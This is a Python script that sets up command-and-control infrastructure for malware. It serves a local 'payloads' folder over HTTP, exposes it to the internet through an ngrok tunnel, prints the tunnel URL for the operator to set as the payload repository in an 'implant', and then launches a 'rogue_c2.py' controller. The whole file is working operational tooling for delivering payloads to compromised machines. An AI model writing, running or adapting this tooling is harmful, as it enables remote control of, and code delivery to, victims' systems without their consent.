#!/usr/bin/env python3
import subprocess
import time
import os
import requests
import threading

NGROK_AUTH_TOKEN = "your-ngrok-auth-token"  # ⛔️ Replace this with your actual token
PAYLOAD_PORT = 8000
NGROK_API = "http://127.0.0.1:4040/api/tunnels"
C2_FILE = "rogue_c2.py"

def install_ngrok_token():
    print("[*] Setting ngrok auth token...")
    subprocess.run(["ngrok", "config", "add-authtoken", NGROK_AUTH_TOKEN], check=True)

def start_payload_server():
    if not os.path.exists("payloads"):
        print("[!] 'payloads/' folder not found.")
        return
    os.chdir("payloads")
    subprocess.Popen(["python3", "-m", "http.server", str(PAYLOAD_PORT)], stdout=subprocess.DEVNULL)
    print(f"[+] Payload HTTP server running on port {PAYLOAD_PORT}")

def start_ngrok():
    subprocess.Popen(["ngrok", "http", str(PAYLOAD_PORT)], stdout=subprocess.DEVNULL)
    time.sleep(5)  # wait for tunnel to initialize
    try:
        tunnels = requests.get(NGROK_API).json()["tunnels"]
        for t in tunnels:
            if t["proto"] == "https":
                return t["public_url"]
    except Exception as e:
        print(f"[!] Error getting ngrok URL: {e}")
        return None

def start_rogue_c2():
    if not os.path.exists(C2_FILE):
        print(f"[!] Could not find {C2_FILE}")
        return
    print("[*] Launching Rogue C2...")
    subprocess.run(["python3", C2_FILE])

def main():
    if NGROK_AUTH_TOKEN == "your-ngrok-auth-token":
        print("[!] Please update NGROK_AUTH_TOKEN in this script first.")
        return

    install_ngrok_token()
    threading.Thread(target=start_payload_server, daemon=True).start()
    
    print("[*] Launching ngrok tunnel...")
    ngrok_url = start_ngrok()

    if ngrok_url:
        print(f"[NGROK] HTTPS Tunnel Ready: {ngrok_url}")
        print(f"[→] Set this in your implant as:\n\n    PAYLOAD_REPO = \"{ngrok_url}/\"\n")
    else:
        print("[!] Ngrok tunnel could not be established.")

    start_rogue_c2()

if __name__ == "__main__":
    main()
